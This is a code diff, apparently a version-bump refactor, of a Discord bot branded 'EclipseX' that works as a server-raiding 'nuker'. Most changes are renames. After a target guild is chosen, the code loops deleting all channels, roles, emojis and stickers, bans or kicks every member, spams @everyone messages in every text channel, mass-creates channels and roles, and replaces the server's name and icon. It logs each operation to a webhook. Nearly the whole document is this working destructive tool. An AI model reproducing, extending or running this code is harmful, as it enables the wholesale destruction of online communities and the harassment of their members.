@@ -8,14 +8,14 @@ import datetime
 ##########SelectGuild##########
 
 class SelectGuildView(View):
-    def __init__(self, Guild):
+    def __init__(self, guild):
         super().__init__(timeout=60)
-        self.add_item(GuildSelect(Guild))
+        self.add_item(GuildSelect(guild))
 
 class GuildSelect(Select):
-    def __init__(self, Guild):
+    def __init__(self, guild):
         options = [
-            discord.SelectOption(label=guild.name, value=str(guild.id)) for guild in Guild
+            discord.SelectOption(label=guild.name, value=str(guild.id)) for guild in guild
         ]
         super().__init__(placeholder="Select Guild", options=options)
 
@@ -29,19 +29,19 @@ class GuildSelect(Select):
             return
         
         config = helper.LoadConfig()
-        SendLogs = config.get("SendLogs", False)
-        guild_id = int(self.values[0])  
+        sendLogs = config.get("SendLogs", False)
+        guildId = int(self.values[0])  
         
-        target_guild = discord.utils.get(interaction.client.guilds, id=guild_id)
+        targetGuild = discord.utils.get(interaction.client.guilds, id=guildId)
         
-        if target_guild:
+        if targetGuild:
             embed = discord.Embed(
                 title="Select Operation",
-                description=f"- **Target Name**: `{target_guild.name}`\n- **Target ID**: `{target_guild.id}`",
+                description=f"- **Target Name**: `{targetGuild.name}`\n- **Target ID**: `{targetGuild.id}`",
                 color=discord.Color.blue()
             )
-            SelectdGduil = target_guild.id
-            view = SelectOperationView(SelectdGduil)
+            selectedGuild = targetGuild.id
+            view = SelectOperationView(selectedGuild)
             await interaction.response.edit_message(embed=embed, view=view)
         else:
             embed = discord.Embed(
@@ -50,13 +50,13 @@ class GuildSelect(Select):
             )
             await interaction.response.edit_message(embed=embed)
 
-        if SendLogs == False:
+        if sendLogs == False:
             pass
         else:
             try:
-                log_webhook = SyncWebhook.from_url(config.get("LogWebhook", ""))
-                if log_webhook:
-                    guild = interaction.client.get_guild(guild_id)
+                logWebhook = SyncWebhook.from_url(config.get("LogWebhook", ""))
+                if logWebhook:
+                    guild = interaction.client.get_guild(guildId)
                     if guild:
                         embed = discord.Embed(
                             title="Guild Selected",
@@ -64,7 +64,7 @@ class GuildSelect(Select):
                             color=discord.Color.blue()
                         )
                         try:
-                            log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
+                            logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                         except:
                             pass
             except:
@@ -73,13 +73,13 @@ class GuildSelect(Select):
 ##########SelectOperation##########
 
 class SelectOperationView(View):
-    def __init__(self, SelectdGduil):
+    def __init__(self, selectedGuild):
         super().__init__(timeout=60)
-        self.add_item(OperationSelect(SelectdGduil))
+        self.add_item(OperationSelect(selectedGuild))
 
 class OperationSelect(Select):
-    def __init__(self, SelectdGduil):
-        self.operation_labels = {
+    def __init__(self, selectedGuild):
+        self.operationLabels = {
             "DCCT": "Delete Channel And Category",
             "SendMessage": "Send Message",
             "DR": "Delete Role",
@@ -94,19 +94,19 @@ class OperationSelect(Select):
         }
         
         options = [
-            discord.SelectOption(label=self.operation_labels["DCCT"], value="DCCT"),
-            discord.SelectOption(label=self.operation_labels["SendMessage"], value="SendMessage"),
-            discord.SelectOption(label=self.operation_labels["DR"], value="DR"),
-            discord.SelectOption(label=self.operation_labels["DE"], value="DE"),
-            discord.SelectOption(label=self.operation_labels["DS"], value="DS"),
-            discord.SelectOption(label=self.operation_labels["MB"], value="MB"),
-            discord.SelectOption(label=self.operation_labels["MK"], value="MK"),
-            discord.SelectOption(label=self.operation_labels["CCT"], value="CCT"),
-            discord.SelectOption(label=self.operation_labels["CC"], value="CC"),
-            discord.SelectOption(label=self.operation_labels["CR"], value="CR"),
-            discord.SelectOption(label=self.operation_labels["CIN"], value="CIN")
+            discord.SelectOption(label=self.operationLabels["DCCT"], value="DCCT"),
+            discord.SelectOption(label=self.operationLabels["SendMessage"], value="SendMessage"),
+            discord.SelectOption(label=self.operationLabels["DR"], value="DR"),
+            discord.SelectOption(label=self.operationLabels["DE"], value="DE"),
+            discord.SelectOption(label=self.operationLabels["DS"], value="DS"),
+            discord.SelectOption(label=self.operationLabels["MB"], value="MB"),
+            discord.SelectOption(label=self.operationLabels["MK"], value="MK"),
+            discord.SelectOption(label=self.operationLabels["CCT"], value="CCT"),
+            discord.SelectOption(label=self.operationLabels["CC"], value="CC"),
+            discord.SelectOption(label=self.operationLabels["CR"], value="CR"),
+            discord.SelectOption(label=self.operationLabels["CIN"], value="CIN")
         ]
-        self.Guild = SelectdGduil
+        self.guild = selectedGuild
         self.running = False
         super().__init__(placeholder="Select Operation", options=options)
 
@@ -120,13 +120,13 @@ class OperationSelect(Select):
             return
 
         operation = self.values[0]
-        SendLogs = helper.LoadConfig().get("SendLogs", False)
-        LogWebhook = helper.LoadConfig().get("LogWebhook", "")
+        sendLogs = helper.LoadConfig().get("SendLogs", False)
+        logWebhook = helper.LoadConfig().get("LogWebhook", "")
 
-        stop_button = Button(style=discord.ButtonStyle.danger, label="Stop", custom_id="stop")
-        self.start_time = datetime.datetime.now()
+        stopButton = Button(style=discord.ButtonStyle.danger, label="Stop", custom_id="stop")
+        self.startTime = datetime.datetime.now()
         
-        async def stop_callback(interaction):
+        async def stopCallback(interaction):
             if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
                 embed = discord.Embed(
                     description="You cannot use this command.",
@@ -134,26 +134,35 @@ class OperationSelect(Select):
                 )
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
+
+            if self.running == False:
+                embed = discord.Embed(
+                    description="**The operation is already stopped.**",
+                    color=discord.Color.red()
+                )
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
             
-            end_time = datetime.datetime.now()
-            operation_duration = end_time - self.start_time
-            duration_str = str(operation_duration).split('.')[0] 
+            endTime = datetime.datetime.now()
+            operationDuration = endTime - self.startTime
+            durationStr = str(operationDuration).split('.')[0] 
             
-            if SendLogs == False:
+            if sendLogs == False:
                 pass
             else:
                 try:
-                    log_webhook = SyncWebhook.from_url(LogWebhook)
-                    if log_webhook:
-                        guild = interaction.client.get_guild(self.Guild)
+                    logWebhook = helper.LoadConfig().get("LogWebhook", "")
+                    logWebhook = SyncWebhook.from_url(logWebhook)
+                    if logWebhook:
+                        guild = interaction.client.get_guild(self.guild)
                         if guild:
                             embed = discord.Embed(
                                 title="Operation Stopped",
-                                description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operation_labels[operation]}`\n- **Duration**: `{duration_str}`",
+                                description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operationLabels[operation]}`\n- **Duration**: `{durationStr}`",
                                 color=discord.Color.red()
                             )
                             try:
-                                log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
+                                logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                             except:
                                 pass
                 except:
@@ -161,184 +170,184 @@ class OperationSelect(Select):
             
             self.running = False
             embed = discord.Embed(
-                description=f"- **Stopping the operation**\n- **Duration**: `{duration_str}`",
+                description=f"- **Stopping the operation**\n- **Duration**: `{durationStr}`",
                 color=discord.Color.red()
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
         
-        stop_button.callback = stop_callback
+        stopButton.callback = stopCallback
         
         view = View()
-        view.add_item(stop_button)
+        view.add_item(stopButton)
         
         embed = discord.Embed(
-            description=f"- **Click the Stop button to stop the operation**\n\n- **Operation**: `{self.operation_labels[operation]}`",
+            description=f"- **Click the Stop button to stop the operation**\n\n- **Operation**: `{self.operationLabels[operation]}`",
             color=discord.Color.blue()
         )
         await interaction.response.send_message(embed=embed, view=view)
         
         self.running = True
 
-        if SendLogs == False:
+        if sendLogs == False:
             pass
         else:
             try:
-                log_webhook = SyncWebhook.from_url(LogWebhook)
-                if log_webhook:
-                    guild = interaction.client.get_guild(self.Guild)
+                logWebhook = SyncWebhook.from_url(logWebhook)
+                if logWebhook:
+                    guild = interaction.client.get_guild(self.guild)
                     if guild:
                         embed = discord.Embed(
                             title="Operation Started",
-                            description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operation_labels[operation]}`",
+                            description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operationLabels[operation]}`",
                             color=discord.Color.blue()
                         )
                         try:
-                            log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
+                            logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                         except:
                             pass
             except:
                 pass
 
         self.operations = {
-            "DCCT": self.delete_channel_and_category,
-            "SendMessage": self.send_message,
-            "DR": self.delete_role,
-            "DE": self.delete_emoji,
-            "DS": self.delete_sticker,
-            "MB": self.ban_member,
-            "MK": self.kick_member,
-            "CCT": self.create_category,
-            "CC": self.create_channel,
-            "CR": self.create_role,
-            "CIN": self.change_icon_and_name
+            "DCCT": self.DeleteChannelAndCategory,
+            "SendMessage": self.SendMessage,
+            "DR": self.DeleteRole,
+            "DE": self.DeleteEmoji,
+            "DS": self.DeleteSticker,
+            "MB": self.BanMember,
+            "MK": self.KickMember,
+            "CCT": self.CreateCategory,
+            "CC": self.CreateChannel,
+            "CR": self.CreateRole,
+            "CIN": self.ChangeIconAndName
         }
 
         if operation in self.operations:
             await self.operations[operation](interaction)
 
-    async def delete_channel_and_category(self, interaction):
+    async def DeleteChannelAndCategory(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.delete_channel_task(channel) for channel in G.channels if channel.id != interaction.channel_id]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.DeleteChannelTask(channel) for channel in g.channels if channel.id != interaction.channel_id]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def send_message(self, interaction):
+    async def SendMessage(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
                 config = helper.LoadConfig()
                 messages = config.get("Messages", [])
                 if messages:
-                    tasks = [self.send_message_to_channel_task(channel, messages) for channel in G.text_channels]
+                    tasks = [self.SendMessageToChannelTask(channel, messages) for channel in g.text_channels]
                     await asyncio.gather(*tasks)
         except:
             pass
 
-    async def delete_role(self, interaction):
+    async def DeleteRole(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.delete_role_task(role) for role in G.roles if role.name != "@everyone"]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.DeleteRoleTask(role) for role in g.roles if role.name != "@everyone"]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def delete_emoji(self, interaction):
+    async def DeleteEmoji(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.delete_emoji_task(emoji) for emoji in G.emojis]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.DeleteEmojiTask(emoji) for emoji in g.emojis]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def delete_sticker(self, interaction):
+    async def DeleteSticker(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.delete_sticker_task(sticker) for sticker in G.stickers]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.DeleteStickerTask(sticker) for sticker in g.stickers]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def ban_member(self, interaction):
+    async def BanMember(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.ban_member_task(member) for member in G.members]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.BanMemberTask(member) for member in g.members]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def kick_member(self, interaction):
+    async def KickMember(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
-                tasks = [self.kick_member_task(member) for member in G.members]
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
+                tasks = [self.KickMemberTask(member) for member in g.members]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def create_category(self, interaction):
+    async def CreateCategory(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
             config = helper.LoadConfig()
             names = config.get("CategoryName", [])
-            if G:
-                tasks = [self.create_category_task(names, G)]
+            if g:
+                tasks = [self.CreateCategoryTask(names, g)]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def create_channel(self, interaction):
+    async def CreateChannel(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
                 config = helper.LoadConfig()
                 names = config.get("ChannelName", [])
-                tasks = [self.create_channel_task(names, G)]
+                tasks = [self.CreateChannelTask(names, g)]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def create_role(self, interaction):
+    async def CreateRole(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
             config = helper.LoadConfig()
             names = config.get("RoleName", [])
-            if G:
-                tasks = [self.create_role_task(names, G)]
+            if g:
+                tasks = [self.CreateRoleTask(names, g)]
                 await asyncio.gather(*tasks)
         except:
             pass
 
-    async def change_icon_and_name(self, interaction):
+    async def ChangeIconAndName(self, interaction):
         try:
-            Gid = self.Guild
-            G = interaction.client.get_guild(Gid)
-            if G:
+            gid = self.guild
+            g = interaction.client.get_guild(gid)
+            if g:
                 config = helper.LoadConfig()
                 name = config.get("GuildName")
                 with open("no1jj/icon.png", "rb") as f:
                     icon = f.read()
-                await G.edit(name=name, icon=icon)
+                await g.edit(name=name, icon=icon)
         except:
             pass
 
-    async def delete_channel_task(self, channel):
+    async def DeleteChannelTask(self, channel):
         try:
             while self.running:
                 if channel:
@@ -348,21 +357,21 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def send_message_to_channel_task(self, channel, messages):
+    async def SendMessageToChannelTask(self, channel, messages):
         try:
             while self.running:
                 config = helper.LoadConfig()
-                send_everyone = config.get("SendEveryone", True)
+                sendEveryone = config.get("SendEveryone", True)
                 
                 message = helper.RandomMessage(messages)
-                if send_everyone:
+                if sendEveryone:
                     message += " @everyone"
                     
                 await channel.send(message)
         except:
             pass
 
-    async def delete_role_task(self, role):
+    async def DeleteRoleTask(self, role):
         try:
             while self.running:
                 if role:
@@ -372,7 +381,7 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def delete_emoji_task(self, emoji):
+    async def DeleteEmojiTask(self, emoji):
         try:
             while self.running:
                 if emoji:
@@ -382,7 +391,7 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def delete_sticker_task(self, sticker):
+    async def DeleteStickerTask(self, sticker):
         try:
             while self.running:
                 if sticker:
@@ -392,7 +401,7 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def ban_member_task(self, member):
+    async def BanMemberTask(self, member):
         try:
             while self.running:
                 if member:
@@ -402,7 +411,7 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def kick_member_task(self, member):
+    async def KickMemberTask(self, member):
         try:
             while self.running:
                 if member:
@@ -412,21 +421,21 @@ class OperationSelect(Select):
         except:
             pass
 
-    async def create_category_task(self, names, guild):
+    async def CreateCategoryTask(self, names, guild):
         try:
             while self.running:
                 await guild.create_category(name=helper.RandomChannelName(names))
         except:
             pass
 
-    async def create_channel_task(self, names, guild):
+    async def CreateChannelTask(self, names, guild):
         try:
             while self.running:
                 await guild.create_text_channel(name=helper.RandomChannelName(names))
         except:
             pass
 
-    async def create_role_task(self, names, guild):
+    async def CreateRoleTask(self, names, guild):
         try:
             while self.running:
                 await guild.create_role(name=helper.RandomRoleName(names))
@@ -434,4 +443,4 @@ class OperationSelect(Select):
             pass
 
 # Made by no.1_jj
-# v1.0.1
+# v1.0.2
